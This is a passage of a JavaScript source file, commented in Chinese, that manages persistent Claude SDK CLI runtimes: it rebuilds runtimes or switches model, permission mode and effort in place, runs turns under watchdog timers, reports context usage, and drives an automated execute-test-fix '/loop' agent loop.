            runtime.settingsRebuildDeferredAt = settingsMtimeMs;
            log.info(`[Claude SDK] ${runtime.key}:settings.json 变了,但后台任务 / CLI 自己的一轮还在跑 —— 先沿用老进程,之后的下一条再重建`);
          }
        } else {
          return rebuildOrRefuse('管理员改了 settings.json,');
        }
      }
    }

    if (runtime && runtime.signature !== signature) {
      /**
       * 签名变了、而后台任务还在跑:不重建(重建会把后台子代理一起停掉,那可能是上一个人或上一个网关发起的工作)。
       * - 换了网关 / key(常见于共享会话里换了一个人发消息,各用各的 key):拒这一条;
       * - 同网关只换模型、且发送者能用起进程时钉住的模型:就地 setModel(见下);
       * - 其余要重建的改动:拒这一条,并说清楚是哪项改动。
       * 没有后台任务时照常 dispose + resume 重建。
       */
      const backgroundAlive = (runtime.liveBackgroundTasks?.size ?? 0) > 0;
      if (backgroundAlive) {
        const credentialChanged = (runtime.gatewayCredential ?? null) !== (options.gateway?.credentialFingerprint ?? null);
        if (credentialChanged) {
          const busy = new Error(
            '这段对话还有后台任务在跑,它们用的是另一个网关或另一把 key —— 等它们跑完,或在后台任务条上停掉,再发这条。',
          );
          busy.prismModelRejected = true;
          busy.code = 'GATEWAY_SWITCH_BLOCKED';
          throw busy;
        }
        /*
         * 别的网关上指纹含模型:后台任务在跑时若只是同网关换模型,不重建,往下走就地 setModel;
         * 别名映射暂时还指着起进程时的那个模型,等后台任务跑完、下一条消息再按签名重建。
         * 前提是发这条的人能用那个模型:共享会话里那可能是别人的限人模型。
         */
        const looseSame = runtime.looseSignature === persistentRuntimeSignature(options, settings, { loose: true });
        // 查库出错 → null:不就地换,拒这一条并按签名差异说明理由,不冒充"你不能用"
        const pinnedUsable = looseSame
          ? await claudeModelCatalog.isUsable(runtime.pinnedModel, turnViewer(options, null)).catch(() => null)
          : null;
        const onlyModelPinChanged = looseSame && pinnedUsable === true;
        if (!onlyModelPinChanged) {
          /*
           * 其余要重建的改动(窗口不同的模型、工具清单、子代理模型……)在后台任务跑着时不重建,
           * 拒这一条并说清楚:重建会把它们一起停掉,共享会话里停的可能是别人的活。
           */
          throw runtimeRebuildBlocked(
            pinnedUsable === false
              ? '这个进程起时用的模型你现在用不了(共享会话里别人的限人模型,或已被管理员下架),换模型'
              : describeSignatureChange(runtime.signature, signature),
          );
        }
        log.info(`[Claude SDK] ${runtime.key}:后台任务还在跑,同网关换模型先就地 setModel,不重建`);
      } else {
        const resumeSessionId = runtime.sessionId || requestedSessionId;
        await disposePersistentRuntime(runtime);
        runtime = await createPersistentRuntime(key, { ...options, resumeSessionId }, settings);
        return runtime;
      }
    }

    if (runtime) {
      // Dynamic controls: model + permission mode without a rebuild.
      /*
       * 这一条可能在下面被拒(后台任务在跑、需要重启 CLI),而 runtime 留着给后台任务用:归属(用量记给谁、
       * appSessionId)要等到不会再拒时才改,否则后台任务之后 CLI 自发的回合会记到被拒的人头上。
       */
      const adoptSender = () => {
        // 复用已有 runtime 时也刷一下 —— 它对一段对话是稳定的,但第一次创建
        // 若走的是没有 runId 的内部路径(prewarm、agent loop),这里是补上的机会。
        if (typeof options.runId === 'string' && options.runId) {
          runtime.appSessionId = options.runId;
        }
        if (typeof options.ownerUserId === 'number') {
          runtime.ownerUserId = options.ownerUserId;
        }
        if (typeof options.actorUsername === 'string' && options.actorUsername) {
          runtime.actorUsername = options.actorUsername;
        }
      };

      if (runtime.currentPermissionMode !== settings.permissionMode) {
        if (typeof runtime.query?.setPermissionMode === 'function') {
          try {
            await withRuntimeControlTimeout(
              runtime.query.setPermissionMode(settings.permissionMode === 'default' ? 'default' : settings.permissionMode),
              'setPermissionMode',
            );
            hold();
            runtime.currentPermissionMode = settings.permissionMode;
          } catch (error) {
            log.warn('[Claude SDK] setPermissionMode failed, rebuilding runtime:', error?.message);
            return rebuildOrRefuse('切换权限档位没成功,');
          }
        } else {
          return rebuildOrRefuse('切换权限档位');
        }
      }
      // 权限档位跟 CLI 那边对上之后再记(审批回调读这份)
      runtime.settings.permissionMode = settings.permissionMode;
      runtime.settings.allowedTools = settings.allowedTools;
      runtime.settings.disallowedTools = settings.disallowedTools;

      const targetModel = toSdkModel(options.model);
      let modelChanged = false;
      if (targetModel && runtime.currentModel !== targetModel) {
        if (typeof runtime.query?.setModel === 'function') {
          try {
            await withRuntimeControlTimeout(runtime.query.setModel(targetModel), 'setModel');
            hold();
            runtime.currentModel = targetModel;
            modelChanged = true;
          } catch (error) {
            if (classifySetModelError(error) === 'rejected') {
              /*
               * CLI 回了拒绝(切模型前 CLI 先向网关发一句确认,网关不认这个名字就拒):原样报给用户,
               * runtime 留着(仍是原来的模型)。不重建:新进程拿着同一个模型名起只会同样失败;
               * 带 prismModelRejected,调度器也不会退回一次性路径用同一个模型再跑一遍。
               */
              log.warn(`[Claude SDK] setModel(${targetModel}) 被拒:`, error?.message);
              const rejected = new Error(`切换到模型「${targetModel}」失败:${error?.message || String(error)}`);
              rejected.prismModelRejected = true;
              throw rejected;
            }
            // 超时 / 网关一时的 429·5xx / 进程通道断了:切模型前那一句确认 CLI 不重试,所以这里重建,
            // 新进程带着新模型起,第一轮走 CLI 自己的重试
            log.warn('[Claude SDK] setModel 没成(超时或暂时性错误),重建 runtime:', error?.message);
            return rebuildOrRefuse('切换模型没成功(CLI 超时或网关一时出错),');
          }
        } else {
          return rebuildOrRefuse('切换模型');
        }
      } else if (!targetModel && runtime.currentModel) {
        // 切回 default 档:这个 runtime 之前被显式定过模型,而 setModel('default')
        // 会退回"字面量透传 → 网关兜底"的老路。重建一个不带 model 的 runtime,
        // 让 CLI 重新按 settings 配置链选默认。切档是低频操作,重建(resume)可接受。
        return rebuildOrRefuse('切回「默认」模型');
      }

      /**
       * 推理档位就地改(applyFlagSettings),不重建:effort 不在签名里,改档位、切到默认档位不同的模型
       * 都不必冷启动重读 transcript。`null` = 回到模型自己的默认档(applyFlagSettings 的约定)。
       * 换了模型也补发一次:CLI 换模型后档位跟着谁走不归我们猜,按 Prism 解析出来的这一档说死。
       */
      const targetEffort = options.resolvedEffort || null;
      // 换模型、但这一档是 null(跟默认)且原来也是 null → 不补发。applyFlagSettings({effortLevel:null})
      // 是"回到模型默认档",会盖掉 settings.json 里的 effortLevel,与新起的 runtime(不传 effort)不一致。
      if ((runtime.currentEffort ?? null) !== targetEffort || (modelChanged && targetEffort !== null)) {
        if (typeof runtime.query?.applyFlagSettings === 'function') {
          try {
            await withRuntimeControlTimeout(runtime.query.applyFlagSettings({ effortLevel: targetEffort }), 'applyFlagSettings(effort)');
            hold();
            runtime.currentEffort = targetEffort;
          } catch (error) {
            log.warn('[Claude SDK] 就地改档位失败,重建 runtime:', error?.message || error);
            // 重建被拒(后台任务在跑)时 runtime 留着:档位记成"不确定",下一条无论如何补发一次;
            // 否则模型已经换过去、下一条 modelChanged=false,档位就再也不补了
            runtime.currentEffort = EFFORT_UNKNOWN;
            return rebuildOrRefuse('改推理档位没成功,');
          }
        } else if ((runtime.currentEffort ?? null) !== targetEffort) {
          return rebuildOrRefuse('改推理档位');
        }
      }

      adoptSender();
      return runtime;
    }

    // No live runtime: create one, resuming when the conversation exists.
    return createPersistentRuntime(key, { ...options, resumeSessionId: requestedSessionId }, settings);
  }).then(claim, (error) => {
    // 被拒的这一条不留预占标记:留着的话这个 runtime 在 CLAIM_STALE_MS 内既不能被淘汰,也不能被空闲回收
    if (held) releaseClaim(held.runtime, held.stamp);
    throw error;
  });
}

/** Runs one turn on a resident runtime and resolves when its result arrives. */
const TURN_UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

async function runPersistentTurn(runtime, { command, images, cwd, imageRoots = [], ws, sessionSummary, isNewSession, compactionTrigger = null, userMessageUuid: requestedUuid = null, abortCheck = null, onTurnStarted = null }) {
  /*
   * 这两道前置拒绝发生在回合开跑之前(runtimeForSend 查过之后,中间还有切模型等 await),错误带
   * prismTurnNotStarted:分发器按「稍后再发」报给用户,不退回一次性路径(runtime 正忙,回退只会再失败一次)。
   */
  if (runtime.turn) throw turnBusyError();
  // 回合结束不等于 CLI 闲下来了:上一回合可能是被中止/超时收掉的,而它起的
  // Bash 还在跑。这时候往 runtime.input 里推东西,消息只会排在那个工具后面 ——
  // 既看不见也取消不掉(线上就是这么"正在压缩"转了二十分钟的)。宁可让调用方
  // 换一个干净的 runtime,也不要把消息塞进一个还在忙的 CLI。
  if (runtime.pendingToolUses.size > 0) {
    throw runtime.orphanTurnOpen
      ? cliTurnBusyError()
      : turnNotStartedError(
        'TOOL_IN_FLIGHT',
        'The CLI still has a tool call in flight for this session',
        '这段对话的 CLI 还有工具调用没收尾,这一条没有发出 —— 稍等几秒再发。',
      );
  }

  let content;
  if (normalizeImageDescriptors(images).length > 0) {
    // 与一次性路径同一条规则 —— 允许的图片目录来自 `chat.send`,这里不再判一遍。
    content = await buildClaudeUserContent(command, images, cwd, imageRoots);
  } else {
    content = [{ type: 'text', text: command }];
  }
  // 读图那段 await 里按的停止:还没有回合可中断,中止处理器只记下了标记,在这里早退,不把消息推给 CLI
  if (typeof abortCheck === 'function' && abortCheck()) {
    throw describeForUser(new Error('Run aborted before the turn started'), 'ABORTED_BEFORE_START', '这一条在开跑前被停止了。');
  }

  const turn = {
    ws,
    sessionSummary,
    isNewSession,
    capturedSessionId: runtime.sessionId || null,
    sessionCreatedSent: false,
    /** 这一回合正在进行的压缩(见 beginCompaction);不在压缩时为 null。 */
    compaction: null,
    // 回合起点与"输入已递交给 CLI"标志,判断回退重放是否安全要用 ——
    // 输入递交之后 CLI 可能已把用户消息写进 transcript,盲目重放会造出重复消息。
    startedAtMs: Date.now(),
    inputDelivered: false,
    /**
     * push 那一刻 CLI 是否正跑着它自己发起的一轮(见 runtime.orphanTurnOpen)。
     * 是的话,本回合收到的第一个 result 若在任何帧之前到达,就是 CLI 自己那轮的
     * 收尾,不能当成本回合结束(见读循环)。
     */
    expectForeignResult: Boolean(runtime.orphanTurnOpen),
    /** 本回合收到过至少一帧(result 之外的任何帧)。 */
    sawFrame: false,
    /**
     * 本回合推进 CLI 的用户消息 uuid(首条 + 合流进来的)。result 上回显的
     * `user_message_uuid(s)` 含其中任何一个才算本回合的(见 classifyTurnResult)。
     */
    userMessageUuids: new Set(),
    /** 这一回合的 token 累加器。见 createUsageAccumulator。 */
    usage: createUsageAccumulator(),
    // 这一回合的预算(压缩阶段另有更短的静默上限,见 armIdleWatchdog)。
    watchdog: TURN_WATCHDOG,
    lastStreamActivityAt: Date.now(),
    idleTimer: null,
    absoluteTimer: null,
    resolve: null,
    reject: null,
  };
  turn.promise = new Promise((resolve, reject) => {
    turn.resolve = resolve;
    turn.reject = reject;
  });

  runtime.turn = turn;
  // 真正开跑了,预占标记让位给 turn(淘汰排序两者都当忙,见 claim)。
  runtime.claimedAt = null;
  runtime.lastUsed = Date.now();
  if (runtime.sessionId) addSession(runtime.sessionId, runtime.query, ws, runtime.abortController);

  // 带上客户端 uuid,CLI 会在这一轮的 result 上原样回显,归属判据靠它。
  // chat 层定好的 uuid(已写进显示日志那一行)优先:文件检查点按它认轮次。
  const userMessageUuid = typeof requestedUuid === 'string' && TURN_UUID_RE.test(requestedUuid) ? requestedUuid : crypto.randomUUID();
  turn.userMessageUuids.add(userMessageUuid);

  try {
    runtime.input.push({
      type: 'user',
      uuid: userMessageUuid,
      session_id: runtime.sessionId || '',
      parent_tool_use_id: null,
      /**
       * 用 `priority: 'now'`:runPersistentTurn 只保证 Prism 这边没有回合在跑,CLI 却可能正跑着它自己发起的
       * 那一轮(后台任务通知)。不带 priority 时这条消息只是排进 CLI 的命令队列,要等那一轮跑完;
       * 带 `'now'` 才是"用户刚敲完回车,现在就送进去"。
       * 这个字段在 SDK 的 `SDKUserMessage` 上,`Query.streamInput` 把整个对象原样写进 CLI 的 stdin。
       */
      priority: 'now',
      message: { role: 'user', content },
    });
    // push 成功 = 消息已进 CLI 的输入流。从这一刻起,CLI 随时可能把它落进
    // transcript —— 之后的失败不能再无条件重放。
    turn.inputDelivered = true;
  } catch (error) {
    runtime.turn = null;
    throw error;
  }
  // 这一条开跑了:之后再按停止就是打断这一轮,不再是"没发出"
  notifyTurnStarted(onTurnStarted);

  // 静默看门狗:流上有动静就续期(续期点在 readPersistentRuntime 的读循环里),
  // 工具在途时到点只续不杀(硬顶 toolSilenceMax)。绝对上限保持旧语义可选。
  touchTurnActivity(runtime, turn);
  // Prism 自己推的 `/compact`:不等 CLI 的 status 帧,立刻点亮 —— 那一帧要等
  // CLI 真的开始压才来,中间那段空白正是用户以为"点了没反应"的地方。
  if (compactionTrigger) {
    beginCompaction(runtime, turn, { trigger: compactionTrigger, blocking: true });
  }
  if (turn.watchdog.absoluteMs > 0) {
    turn.absoluteTimer = setTimeout(() => {
      if (runtime.turn !== turn) return; // result arrived in the meantime
      fireTurnTimeout(runtime, turn,
        `Claude turn exceeded the absolute cap of ${Math.round(turn.watchdog.absoluteMs / 1000)}s; the session runtime was restarted`,
        'TURN_ABSOLUTE_CAP',
        `这一轮跑了 ${describeDuration(turn.watchdog.absoluteMs)},到了服务端设置的单轮上限,已结束这一轮并重启这段对话的 CLI。直接再发一条即可接着聊。`);
    }, turn.watchdog.absoluteMs);
    turn.absoluteTimer.unref?.();
  }

  return turn.promise;
}

/**
 * Reads native context usage off a resident runtime (best effort).
 *
 * `detail: 'summary'` 用上一次回复的 usage 加本地估算作答,不打逐类的 `count_tokens`(full 每次要打
 * 13–14 个)。回合结束与回填这两处只要总数与分母,传 summary;用户主动点的 REST
 * `/api/claude/context-usage` 保持 full。
 */
async function readRuntimeContextUsage(runtime, { detail } = {}) {
  if (!runtime || runtime.disposed || typeof runtime.query?.getContextUsage !== 'function') {
    return null;
  }
  /*
   * 压缩之后的第一次读取不用 summary:/compact 之后 summary 仍报压缩前的总数,要等下一次模型调用才更新,
   * 用量环会停在压缩前,切小窗口模型的压缩线判断也会拿旧数把用户挡在 /compact 之后。
   * 只在压过之后多打这一次 count_tokens。
   */
  const afterCompaction = detail === 'summary' && runtime.compactedSinceUsageRead;
  if (afterCompaction) detail = 'full';
  try {
    const usage = await Promise.race([
      detail ? runtime.query.getContextUsage({ detail }) : runtime.query.getContextUsage(),
      new Promise((resolve) => setTimeout(() => resolve(null), CONTEXT_USAGE_TIMEOUT_MS)),
    ]);
    if (!usage || typeof usage !== 'object') return null;
    const totalTokens = readNumber(usage.totalTokens ?? usage.total_tokens);
    const maxTokens = readNumber(usage.maxTokens ?? usage.max_tokens);
    if (!totalTokens || !maxTokens) return null;
    const normalized = {
      totalTokens,
      maxTokens,
      ratio: totalTokens / maxTokens,
      at: Date.now(),
      /*
       * 这三个字段由 SDK 返回;每个 runtime 第一次拿到时打一行日志,"CLI 开没开自动压缩、阈值多少"
       * 在日志里就能查到。
       *
       * `maxTokens` 是有效窗口 = min(模型窗口, autoCompactWindow),不是触发线;触发线是另一个字段
       * `autoCompactThreshold`(默认 = 有效窗口 − 33000)。用量环的分母用有效窗口,与模型目录里填的窗口同一口径。
       */
      rawMaxTokens: readNumber(usage.rawMaxTokens ?? usage.raw_max_tokens) || null,
      autoCompactEnabled: typeof usage.isAutoCompactEnabled === 'boolean' ? usage.isAutoCompactEnabled : null,
      autoCompactThreshold: readNumber(usage.autoCompactThreshold) || null,
    };
    if (!runtime.contextUsageShapeLogged) {
      runtime.contextUsageShapeLogged = true;
      log.info(
        `[Claude SDK] Runtime ${runtime.key} 上下文:${totalTokens}/${maxTokens}`
        + `(真窗口 ${normalized.rawMaxTokens ?? '?'})`
        + ` · CLI 自动压缩 ${normalized.autoCompactEnabled === null ? '未知' : (normalized.autoCompactEnabled ? '开' : '关')}`
        + ` · 阈值 ${normalized.autoCompactThreshold ?? '默认'}`
      );
    }
    runtime.lastContextUsage = normalized;
    // 读成了才清"压过"的标记:full 读超时 / 失败时下一次还用 full
    if (afterCompaction) runtime.compactedSinceUsageRead = false;
    return normalized;
  } catch (error) {
    log.warn('[Claude SDK] getContextUsage failed:', error?.message || error);
    return null;
  }
}

/**
 * @param {Object|null} runtime - 目前只用于日志/调试;用量本身全在 `usage` 里。
 */
function sendContextUsageEvent(ws, sessionId, usage, runtime = null) {
  if (!usage) return;
  ws.send(createNormalizedMessage({
    kind: 'status',
    text: 'token_budget',
    tokenBudget: {
      used: usage.totalTokens,
      total: usage.maxTokens,
      inputTokens: usage.totalTokens,
      outputTokens: 0,
      contextExact: true,
      breakdown: { input: usage.totalTokens, output: 0 },
      // 分母 `total` 是有效窗口 min(模型窗口, autoCompactWindow),不是压缩触发线。触发线另给一个字段,
      // 界面要画"压缩线"或判断"切到小窗口模型会不会一上来就压"时用它。
      ...(usage.autoCompactThreshold ? { compactThreshold: usage.autoCompactThreshold } : {}),
    },
    sessionId: sessionId || null,
    provider: 'claude',
  }));
}

/**
 * Backfills `runtime.lastContextUsage` after a runtime is (re)created for an
 * EXISTING conversation. Without it the context ring stays blank until a turn
 * completes and the auto-compact check is blind on the first turn after a
 * rebuild/restart. Non-blocking and best-effort: skipped when a turn is
 * already active so it can never race one, and the result is pushed through
 * the usual token_budget channel to whatever socket started the send.
 * @param {Object} runtime - Persistent runtime (resume path only has a sessionId)
 * @param {Object} ws - Writer for the current send
 */
function scheduleContextUsageBackfill(runtime, ws) {
  if (!runtime || runtime.disposed || runtime.turn) return;
  if (!runtime.sessionId || runtime.lastContextUsage || runtime.contextBackfillStarted) return;
  runtime.contextBackfillStarted = true;
  (async () => {
    // 回填只要总数与分母:用 summary,不打 count_tokens。
    const usage = await readRuntimeContextUsage(runtime, { detail: 'summary' });
    if (usage && !runtime.disposed) {
      sendContextUsageEvent(ws, runtime.sessionId, usage, runtime);
    }
  })().catch((error) => {
    log.warn('[Claude SDK] Context usage backfill failed:', error?.message || error);
  });
}

/**
 * Persistent-mode implementation of one chat turn. Compaction is owned by the
 * CLI and happens inside the turn; the native session id never changes across it.
 */
async function queryClaudeSDKPersistent(command, options = {}, ws, runEntry = null) {
  const { sessionId, sessionSummary } = options;

  /**
   * 按 app 会话 id 查"下一轮用哪个模型"(见 modelLookupSessionId)。
   *
   * `/models` 的写入走 `POST /:provider/sessions/:sessionId/active-model`,路由里的 `sessionId` 是前端给的
   * app 会话 id;`options.sessionId` 装的是 provider_session_id,网页会话里两者必然不同。拿后者去查,
   * 用户在 /models 里换的模型下一轮不生效,界面上 `getCurrentActiveModel` 却会把它报成已生效。
   */
  const resolvedModel = await providerModelsService.resolveResumeModel('claude', modelLookupSessionId(options), options.model);
  const viewer = turnViewer(options, ws);
  // 档位表按人(私有模型的档位也在里面)
  const effortModels = effortModelsFor(viewer);
  const model = resolvedModel || options.model;
  const resolvedEffort = resolveClaudeEffort(model, options.effort, effortModels);
  // 闸口 + 目录窗口 + 网关与 key + 子代理模型,全部按人(见 modelRuntimeSettings)。
  const { contextWindow, gateway, subagentEnv } = await modelRuntimeSettings(model, viewer);

  // ownerUserId:runtime 记在谁头上(名额满了按人公平淘汰)。
  // compactCommand:切到小窗口模型被压缩线挡住时,/compact 这一轮用当前模型跑(见 runtimeForSend)。
  const runtimeOptions = {
    ...options, model, resolvedEffort, contextWindow, gateway, subagentEnv, ownerUserId: ws?.userId ?? null,
    compactCommand: isCompactCommand(command),
  };
  /*
   * 等 runtime 的那段时间(上一轮收尾、CLI 自己那一轮跑完)按了停止就不再等。只看这一次发送自己的标记:
   * 按会话 id 记的中止标记可能是上一轮留下的(停止后马上重发正是这个场景),拿它判会把这一条当成已停止吞掉。
   */
  let runtime = await runtimeForSend(runtimeOptions, { isAborted: () => Boolean(runEntry?.aborted) });
  if (runEntry) runEntry.runtime = runtime;
  // 这次发送盖的预占标记(见 runtimeForSend 的 claim);回合开跑时 runPersistentTurn 会把它清掉
  const claimStamp = runtime.claimedAt;

  // Rebuilt runtime for an existing conversation: probe real context usage in
  // the background so the ring isn't blank and auto-compact isn't blind.
  scheduleContextUsageBackfill(runtime, ws);

  /** Abort state for THIS run, whichever route recorded it (runId or session id). */
  const wasRunAborted = () => Boolean(
    (runEntry && runEntry.aborted)
    || (runtime.sessionId && abortedSessionIds.has(runtime.sessionId))
    || (sessionId && abortedSessionIds.has(sessionId))
  );

  /** Finish like a normal user abort: the abort handler already sent the terminal complete. */
  const finishAborted = () => {
    if (runtime.sessionId) abortedSessionIds.delete(runtime.sessionId);
    if (sessionId) abortedSessionIds.delete(sessionId);
    const sid = runtime.sessionId || sessionId || null;
    notifyRunStopped({
      userId: ws?.userId || null,
      provider: 'claude',
      sessionId: sid,
      sessionName: sessionSummary,
      stopReason: 'aborted',
    });
    return { sessionId: sid };
  };

  // 压缩归 CLI,在用户回合内部发生,这里不做发送前 / 回合后的压缩(压缩阶段的静默上限见 armIdleWatchdog)。

  // ---- the user's actual turn ----
  const wasNewSession = !sessionId;
  let turnResult;
  try {
    // Abort may also land between chat.send and the first input push (the
    // runId registry makes that window abortable) — bail out before running.
    if (wasRunAborted()) {
      return finishAborted();
    }

    turnResult = await runPersistentTurn(runtime, {
      command,
      images: options.images,
      cwd: options.cwd,
      // 允许的图片目录由 `chat.send` 那道门算好传过来(见 imageSourceRoots)。
      imageRoots: options.imageRoots,
      ws,
      sessionSummary,
      isNewSession: wasNewSession,
      // 手打 /compact 也是压缩,而且用户正等着 —— 按回车就点亮,别等 CLI 的 status 帧。
      compactionTrigger: isCompactCommand(command) ? 'manual' : null,
      // 这一轮的 uuid(chat 层定的,显示日志那一行带着它)
      userMessageUuid: options.userMessageUuid ?? null,
      // 带图消息构造内容那段 await 里按的停止
      abortCheck: wasRunAborted,
      onTurnStarted: options.onTurnStarted,
    });
  } finally {
    // 回合没开跑就结束了(开跑前被停止、被拒、构造内容出错):这次发送盖的预占标记就地撤掉。
    // 留着的话这个 runtime 在 CLAIM_STALE_MS 内既不能被淘汰,也不能被空闲回收。
    releaseClaim(runtime, claimStamp);
  }
  const { resultMessage, sessionId: finalSessionId } = turnResult;

  const wasAborted = (finalSessionId ? abortedSessionIds.delete(finalSessionId) : false)
    || Boolean(runEntry?.aborted);

  // 模型健康度 + 失败时给一句人话(界面上弹一条,不进历史)
  if (!wasAborted) {
    recordModelTurnStat(resultMessage, { model: runtime.currentModel || options.model || null, source: options.usageSource || 'chat' });
    const failureHint = resultMessage?.is_error ? describeTerminalReason(resultMessage.terminal_reason) : null;
    if (failureHint) {
      ws.send(createNormalizedMessage({ kind: 'status', status: 'cli_notice', level: 'warning', content: failureHint, sessionId: finalSessionId || sessionId || null, provider: 'claude' }));
    }
  }

  // ---- post-turn native context usage → exact ring on the client ----
  // 每轮结束都读一次,只要总数与分母,所以用 summary(full 每次多打 13–14 个 count_tokens)。
  let usage = await readRuntimeContextUsage(runtime, { detail: 'summary' });
  sendContextUsageEvent(ws, finalSessionId || sessionId || null, usage, runtime);

  if (!wasAborted) {
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: finalSessionId || sessionId || null, exitCode: resultMessage?.is_error ? 1 : 0 }));
  }
  notifyRunStopped({
    userId: ws?.userId || null,
    provider: 'claude',
    sessionId: finalSessionId || sessionId || null,
    sessionName: sessionSummary,
    stopReason: wasAborted ? 'aborted' : 'completed',
  });

  return { sessionId: finalSessionId || sessionId || null };
}

/* ------------------------------------------------------------------ */
/*  /loop — autonomous execute→test→fix loop (Prism)                   */
/* ------------------------------------------------------------------ */

/**
 * Runs `/loop <goal>`: repeated persistent turns against the SAME native
 * conversation, running the project's verification command between rounds
 * and feeding failures back until tests pass or rounds run out.
 */
async function runAgentLoop(loopSpec, options = {}, ws, runEntry = null) {
  const { sessionId, sessionSummary } = options;
  const sendStatus = (text) => ws.send(createNormalizedMessage({
    kind: 'status', text, canInterrupt: true, sessionId: sessionId || null, provider: 'claude',
  }));
  const sendNote = (content) => ws.send(createNormalizedMessage({
    kind: 'text', role: 'assistant', content, sessionId: sessionId || null, provider: 'claude',
  }));

  // 按 app 会话 id 查模型覆盖(见 modelLookupSessionId)。
  const resolvedModel = await providerModelsService.resolveResumeModel('claude', modelLookupSessionId(options), options.model);
  const viewer = turnViewer(options, ws);
  const effortModels = effortModelsFor(viewer);
  const model = resolvedModel || options.model;
  const resolvedEffort = resolveClaudeEffort(model, options.effort, effortModels);
  // 闸口 + 目录窗口 + 网关与 key(按人);/loop 同样走常驻 runtime。
  const { contextWindow, gateway, subagentEnv } = await modelRuntimeSettings(model, viewer);
  // ownerUserId:runtime 记在谁头上(名额满了按人公平淘汰)。
  const runtimeOptions = { ...options, model, resolvedEffort, contextWindow, gateway, subagentEnv, ownerUserId: ws?.userId ?? null };
  /**
   * 验证命令自己的中止手柄,挂在 runEntry 上给中止处理器用(见 abortClaudeSDKRun)。不借 runtime 的
   * abortController:那个一 abort,整个常驻 CLI 连同后台任务都没了。
   */
  const loopAbortController = new AbortController();
  if (runEntry) runEntry.loopAbortController = loopAbortController;

  const testCommand = loopSpec.testCommand || await detectTestCommand(options.cwd);
  const totalRounds = loopSpec.rounds;

  sendNote([
    `🔁 **Agent Loop 启动**`,
    `目标：${loopSpec.goal}`,
    `最大轮数：${totalRounds} · 验证命令：${testCommand ? `\`${testCommand}\`` : '未检测到（将只执行 1 轮）'}`,
  ].join('\n'));

  // 等 runtime 时按了停止就不再等(见 queryClaudeSDKPersistent 的同一处);第 1 轮开跑前的检查按停止收尾
  const sendAborted = () => Boolean(runEntry?.aborted);
  let runtime;
  try {
    runtime = await runtimeForSend(runtimeOptions, { isAborted: sendAborted });
  } catch (error) {
    // 一轮都没开跑就被拒:告诉调用方(chat 层把已落库的用户行标成撤回)
    if (error?.prismTurnNotStarted && !runEntry?.aborted) notifyTurnNotStarted(options, error);
    throw error;
  }
  if (runEntry) runEntry.runtime = runtime;
  // 这次领用盖的预占标记;一轮都没开跑就结束时在循环之后撤掉(见 releaseClaim)
  let claimStamp = runtime.claimedAt;
  scheduleContextUsageBackfill(runtime, ws);
  let finalSessionId = sessionId || null;
  let passed = false;
  let aborted = false;
  /** 最后一轮模型是否自己报了错;没有验证命令时用它决定收尾码(见 loopExitCode)。 */
  let lastTurnWasError = false;
  let lastTestOutput = '';
  let round = 0;
  const effectiveRounds = testCommand ? totalRounds : 1;

  for (round = 1; round <= effectiveRounds; round += 1) {
    // 每一轮开跑前看一眼中止标记:停止可能落在启动阶段(探测验证命令、排队等 runtime、冷启动、切模型),
    // 那时还没有回合可中断,中止处理器只记下了标记;不看的话第 1 轮照样整轮跑完。
    if ((finalSessionId && abortedSessionIds.delete(finalSessionId)) || runEntry?.aborted) {
      aborted = true;
      break;
    }
    sendStatus(`Loop ${round}/${effectiveRounds} · Claude 执行中…`);

    const prompt = round === 1
      ? `${loopSpec.goal}\n\n[Agent Loop 第 ${round}/${effectiveRounds} 轮] 完成目标后确保代码可运行${testCommand ? `，验证命令为 \`${testCommand}\`` : ''}。`
      : `[Agent Loop 第 ${round}/${effectiveRounds} 轮] 上一轮的验证命令 \`${testCommand}\` 未通过，输出如下：\n\`\`\`\n${lastTestOutput}\n\`\`\`\n请分析失败原因并继续修复，直到验证通过。`;

    let turnResult;
    try {
      turnResult = await runPersistentTurn(runtime, {
        command: prompt,
        images: [],
        cwd: options.cwd,
        ws,
        sessionSummary,
        isNewSession: !finalSessionId && round === 1 && !sessionId,
        // 第 1 轮推进去才算这一条开跑了(之后几轮再调也没有影响)
        onTurnStarted: options.onTurnStarted,
      });
    } catch (error) {
      // 停止升级成强制中止时这一轮会以「runtime 已关闭」失败:按停止收尾,不报执行失败
      if ((finalSessionId && abortedSessionIds.delete(finalSessionId)) || runEntry?.aborted) {
        aborted = true;
        break;
      }
      // 这一轮没跑成也是失败:没有验证命令时收尾码只看它(见 loopExitCode)
      lastTurnWasError = true;
      // 第 1 轮就没开跑:模型一句都没收到,告诉调用方(chat 层把已落库的用户行标成撤回)
      if (round === 1 && error?.prismTurnNotStarted) notifyTurnNotStarted(options, error);
      log.warn(`[Claude SDK] Loop round ${round} failed:`, error?.message || error);
      sendNote(`⚠️ Loop 第 ${round} 轮执行失败：${userFacingErrorText(error)}`);
      break;
    }

    finalSessionId = turnResult.sessionId || finalSessionId;

    // User pressed stop: the abort handler already sent the terminal complete.
    if ((finalSessionId && abortedSessionIds.delete(finalSessionId)) || runEntry?.aborted) {
      aborted = true;
      break;
    }
    if (turnResult.resultMessage?.is_error) {
      lastTurnWasError = true;
      sendNote(`⚠️ Loop 第 ${round} 轮的执行返回了错误，循环终止。`);
      break;
    }
    if (runtime.disposed) {
      runtime = await runtimeForSend({ ...runtimeOptions, sessionId: finalSessionId || sessionId }, { isAborted: sendAborted });
      if (runEntry) runEntry.runtime = runtime;
      claimStamp = runtime.claimedAt;
    }

    if (!testCommand) break;

    sendStatus(`Loop ${round}/${effectiveRounds} · 运行验证：${testCommand}`);
    /**
     * 验证命令挂上这次 /loop 自己的中止信号(见 runTestCommand),用户按停止时验证进程随之终止。
     */
    const test = await runTestCommand(options.cwd, testCommand, {
      signal: loopAbortController.signal,
    });
    lastTestOutput = test.output || '(无输出)';

    // 被叫停就当场收尾,不再进下一轮。
    if (test.cancelled) {
      aborted = true;
      break;
    }

    /**
     * 验证跑完之后、进下一轮之前再看一次中止标记。验证命令可能跑几分钟,停止若落在 execFile
     * 已经返回之后,signal 不会生效;不在这里检查的话下一轮照样会起,「停止」就只停了这一轮。
     */
    if ((finalSessionId && abortedSessionIds.delete(finalSessionId)) || runEntry?.aborted) {
      aborted = true;
      break;
    }

    if (test.ok) {
      passed = true;
      sendNote(`✅ **Loop 第 ${round} 轮验证通过**\n\`\`\`\n${lastTestOutput.slice(-1500)}\n\`\`\``);
      break;
    }
    sendNote(`❌ Loop 第 ${round} 轮验证未通过${round < effectiveRounds ? '，继续下一轮修复…' : ''}`);
  }
